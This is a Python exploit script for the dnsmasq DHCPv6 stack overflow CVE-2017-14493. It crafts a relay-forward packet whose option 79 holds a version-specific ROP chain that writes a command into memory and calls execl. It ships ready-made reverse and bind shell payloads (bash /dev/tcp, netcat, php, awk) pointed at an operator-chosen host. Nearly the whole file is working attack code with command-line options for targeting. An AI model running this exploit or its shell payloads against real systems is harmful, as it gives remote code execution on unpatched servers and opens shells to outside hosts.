#!/usr/bin/env python

from base import Base
from argparse import ArgumentParser
from socket import socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP, SOL_SOCKET, SO_SNDBUF
from sys import exit

# dnsmasq/2.77 segments address without ASLR
# 0x0804a310 - 0x08082acc is .text
# 0x0808b220 - 0x0808c054 is .data
# 0x0808c060 - 0x0808c374 is .bss

# dnsmasq/2.76 segments address without ASLR
# 0x08049f10 - 0x0807d372 is .text
# 0x08096240 - 0x08097052 is .data
# 0x08097060 - 0x080973a8 is .bss

# dnsmasq/2.75 segments address without ASLR
# 0x08049ee0 - 0x0807b7d2 is .text
# 0x08093240 - 0x08093f5c is .data
# 0x08093f60 - 0x08094290 is .bss

# NOP
NOPx86 = 0x90909090
NOPx64 = 0x9090909090909090

# CRASH
CRASHx86 = 0x41414141
CRASHx64 = 0x4141414141414141

# ROP gadgets
# dnsmasq/2.77 x86 without ASLR
POP_EAX_277x86 = 0x08081617        # pop eax; ret
POP_EBX_EBP_277x86 = 0x0804a392    # pop ebx; pop ebp; ret
MOV_EAX_EBX_277x86 = 0x080672c3    # mov [eax+0x1],ebx; add cl,cl; ret
EXECL_277x86 = 0x08070758          # execl

# dnsmasq/2.76 x86 without ASLR
# POP_EAX_276x86 = 0x08051c90  # pop eax ; or byte ptr [ebp - 0x3e99f590], cl ; ret
# MOV_EAX_EDX_276x86 = 0x08065fc1  # mov dword ptr [eax + 0x68], edx ; ret
POP_EAX_EBX_276x86 = 0x0804a0d4  # pop eax ; pop ebx ; pop esi ; ret
MOV_EAX_EBX_276x86 = 0x0804d653  # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
EXECL_276x86 = 0x0806c23c        # execl

# dnsmasq/2.75 x86 without ASLR
POP_EAX_275x86 = 0x0805cbfa      # pop eax ; ret
POP_EBX_275x86 = 0x08049641      # pop ebx ; ret
MOV_EAX_EBX_275x86 = 0x0804d433  # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
EXECL_275x86 = 0x0806c00e        # execl


# Segment .text
# dnsmasq/2.77 x86 without ASLR
TEXT_277x86 = 0x0804a310

# dnsmasq/2.76 x86 without ASLR
TEXT_276x86 = 0x08049f10

# dnsmasq/2.75 x86 without ASLR
TEXT_275x86 = 0x08049ee0


# Segment .data
# dnsmasq/2.77 x86 without ASLR
DATA_277x86 = 0x0808b220

# dnsmasq/2.76 x86 without ASLR
DATA_276x86 = 0x08096240

# dnsmasq/2.75 x86 without ASLR
DATA_275x86 = 0x08093240


Base = Base()
Base.print_banner()

parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 (Stack Based overflow)')

parser.add_argument('-t', '--target', type=str, help='Set target IPv6 address', required=True)
parser.add_argument('-p', '--target_port', type=int, help='Set target port, default=547', default=547)
parser.add_argument('-c', '--capacity', help='Set capacity (x86 or x86_64), default=x86', default='x86')
parser.add_argument('-v', '--version', help='Set dnsmasq version (2.75, 2.76, 2.77), default=2.77', default='2.77')

parser.add_argument('--interpreter', type=str, help='Set path to interpreter on target, ' +
                                                    'default="/bin/bash"', default='/bin/bash')
parser.add_argument('--interpreter_arg', type=str, help='Set interpreter argument, default="-c"', default='-c')

parser.add_argument('--payload', help='Set payload (bind_awk, reverse_awk, reverse_bash, reverse_php, reverse_nc, ' +
                                      'reverse_nce), default=reverse_nc', default='reverse_nc')
parser.add_argument('--command', type=str, help='Set command for executing on target')

parser.add_argument('--bind_port', type=int, help='Set bind port, default=4444', default=4444)
parser.add_argument('--reverse_port', type=int, help='Set reverse port, default=4444', default=4444)
parser.add_argument('--reverse_host', type=str, help='Set reverse host, default="127.0.0.1"', default="127.0.0.1")

args = parser.parse_args()

host = str(args.target)
port = int(args.target_port)

capacity = ""
if args.capacity == "x86" or args.capacity == "x86_64":
    capacity = args.capacity
else:
    print Base.c_error + "Bad capacity: " + args.capacity + " allow only x86 or x86_64!"
    exit(1)

dnsmasq_version = ""
if args.version == "2.75" or args.version == "2.76" or args.version == "2.77":
    dnsmasq_version = args.version
else:
    print Base.c_error + "Bad dnsmasq version: " + args.version + " allow only 2.75, 2.76 or 2.77!"
    exit(1)

interpreter = str(args.interpreter)
interpreter_arg = str(args.interpreter_arg)

bind_port = str(4444)
reverse_port = str(4444)

if 0 < int(args.bind_port) < 65535:
    bind_port = str(args.bind_port)
else:
    print Base.c_error + "Bad bind port: " + str(args.bind_port) + " allow only 1 ... 65534 ports"

if 0 < int(args.reverse_port) < 65535:
    reverse_port = str(args.reverse_port)
else:
    print Base.c_error + "Bad reverse port: " + str(args.reverse_port) + " allow only 1 ... 65534 ports"

reverse_host = str(args.reverse_host)

# Payloads
# Bind payloads
bind_awk = "awk 'BEGIN{s=\"/inet/tcp/" + bind_port + \
           "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"

# Reverse payloads
reverse_awk = "awk 'BEGIN{s=\"/inet/tcp/0/" + reverse_host + "/" + reverse_port + \
              "\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'"
reverse_bash = "bash -i >& /dev/tcp/" + reverse_host + "/" + reverse_port + " 0>&1"
reverse_php = "php -r '$sock=fsockopen(\""+reverse_host+"\","+reverse_port+");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
reverse_nc = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + reverse_host + " " + reverse_port + " >/tmp/f"
reverse_nce = "nc -e /bin/sh " + reverse_host + " " + reverse_port

payload = ""
if args.command is not None:
    payload = args.command
else:
    if args.payload == "bind_awk": payload = bind_awk
    elif args.payload == "reverse_awk": payload = reverse_awk
    elif args.payload == "reverse_bash": payload = reverse_bash
    elif args.payload == "reverse_php": payload = reverse_php
    elif args.payload == "reverse_nc": payload = reverse_nc
    elif args.payload == "reverse_nce": payload = reverse_nce
    else:
        print Base.c_error + "Bad payload: " + args.version + " allow only bind_awk, reverse_awk, reverse_bash, " + \
              "reverse_php, reverse_nc, reverse_nce!"
        exit(1)


def send_packet(data, host, port):
    print Base.c_info + "Sending " + str(len(data)) + " bytes to " + str(host) + ":" + str(port)
    sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)

    sock.setsockopt(SOL_SOCKET, SO_SNDBUF, len(data))
    if sock.sendto(data, (host, port)) != len(data):
        print Base.c_error + "Could not send (full) payload"
    sock.close()


def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        Base.pack16(option),
        Base.pack16(length),
        data])


def add_string_in_data(addr_in_data, string):
    rop_chain = ""

    if capacity == "x86":
        if len(string) % 4 == 0:
            string = string + "\x00" * 4
        else:
            string = string + "\x00" * (4 - (len(string) % 4))

    if capacity == "x64":
        if len(string) % 8 == 0:
            string = string + "\x00" * 8
        else:
            string = string + "\x00" * (8 - (len(string) % 8))

    if capacity == "x86":
        if dnsmasq_version == "2.77":
            for x in range(0, len(string), 4):
                rop_chain += Base.pack32(POP_EAX_277x86)        # pop eax; ret
                rop_chain += Base.pack32(addr_in_data - 1 + x)  # address in .data - 1
                rop_chain += Base.pack32(POP_EBX_EBP_277x86)    # pop ebx; pop ebp; ret
                rop_chain += string[x:x + 4]                    # 4 byte of string
                rop_chain += Base.pack32(DATA_277x86 + 28)      # 0x0808c054 + 28
                rop_chain += Base.pack32(MOV_EAX_EBX_277x86)    # mov [eax+0x1],ebx; add cl,cl; ret

        if dnsmasq_version == "2.76":
            for x in range(0, len(string), 4):
                rop_chain += Base.pack32(POP_EAX_EBX_276x86)    # pop eax ; pop ebx ; pop esi ; ret
                rop_chain += Base.pack32(addr_in_data + x)      # address in .data
                rop_chain += string[x:x + 4]                    # 4 byte of string
                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in esi
                rop_chain += Base.pack32(MOV_EAX_EBX_276x86)    # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in ebx
                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in esi

        if dnsmasq_version == "2.75":
            for x in range(0, len(string), 4):
                rop_chain += Base.pack32(POP_EAX_275x86)        # pop eax ; ret
                rop_chain += Base.pack32(addr_in_data + x)      # address in .data
                rop_chain += Base.pack32(POP_EBX_275x86)        # pop ebx ; ret
                rop_chain += string[x:x + 4]                    # 4 byte of string
                rop_chain += Base.pack32(MOV_EAX_EBX_275x86)    # mov dword ptr [eax], ebx ; pop ebx ; pop esi ; ret
                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in ebx
                rop_chain += Base.pack32(NOPx86)                # NOP (0x90909090) in esi

    return rop_chain


if __name__ == '__main__':
    option_79 = ""
    if capacity == "x86":

        interpreter_addr = 0x00000000
        if dnsmasq_version == "2.77":
            interpreter_addr = DATA_277x86
        elif dnsmasq_version == "2.76":
            interpreter_addr = DATA_276x86
        elif dnsmasq_version == "2.75":
            interpreter_addr = DATA_275x86
        else:
            print Base.c_error + "This dnsmasq version: " + dnsmasq_version + " not yet supported!"
            exit(1)

        interpreter_arg_addr = interpreter_addr + len(interpreter) + (4 - (len(interpreter) % 4)) + 4
        payload_addr = interpreter_arg_addr + len(interpreter_arg) + (4 - (len(interpreter_arg) % 4)) + 4

        option_79 += Base.pack16(0)  # mac_type

        if dnsmasq_version == "2.77":
            option_79 += "0" * 36  # JUNK
        elif dnsmasq_version == "2.76":
            option_79 += "0" * 24  # JUNK
        elif dnsmasq_version == "2.75":
            option_79 += "0" * 24  # JUNK

        option_79 += Base.pack32(NOPx86)  # EBX = 0x90909090
        option_79 += Base.pack32(NOPx86)  # ESI = 0x90909090
        option_79 += Base.pack32(NOPx86)  # EDI = 0x90909090

        if dnsmasq_version == "2.77":
            option_79 += Base.pack32(0x08080DDE)  # EBP ; ret (JUNK)

        option_79 += add_string_in_data(interpreter_addr, interpreter)
        option_79 += add_string_in_data(interpreter_arg_addr, interpreter_arg)
        option_79 += add_string_in_data(payload_addr, payload)

        if dnsmasq_version == "2.77":
            option_79 += Base.pack32(EXECL_277x86)  # address of execl
        elif dnsmasq_version == "2.76":
            option_79 += Base.pack32(EXECL_276x86)  # address of execl
        elif dnsmasq_version == "2.75":
            option_79 += Base.pack32(EXECL_275x86)  # address of execl

        option_79 += Base.pack32(interpreter_addr)      # address of interpreter
        option_79 += Base.pack32(interpreter_addr)      # address of interpreter
        option_79 += Base.pack32(interpreter_arg_addr)  # address of interpreter argument
        option_79 += Base.pack32(payload_addr)          # address of payload

    else:
        print Base.c_error + "This capacity: " + capacity + " not yet supported!"
        exit(1)
    
    pkg = b"".join([
        Base.pack8(12),       # DHCP6RELAYFORW
        Base.pack16(0x0313),  #
        Base.pack8(0x37),     # transaction ID
        b"_" * (34 - 4),      #
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, option_79),
    ])

    send_packet(pkg, host, int(port))